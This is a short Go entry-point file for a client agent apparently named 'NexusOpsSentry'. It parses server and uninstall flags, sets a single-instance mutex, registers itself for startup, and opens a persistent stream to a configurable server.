package main

import (
	"flag"
	"os"
)

func main() {
	serverAddr := flag.String("server", "localhost:50051", "Server IP:Port")
	uninstall := flag.Bool("uninstall", false, "Remove from startup")
	flag.Parse()

	if *uninstall {
		handleUninstall()
	}

	// Prevent double-running
	if !createMutex("Global\\NexusOpsSentryMutex") {
		os.Exit(0)
	}

	setAutoStart(*serverAddr)

	// Start the infinite communication loop
	startResilientStream(*serverAddr)
}
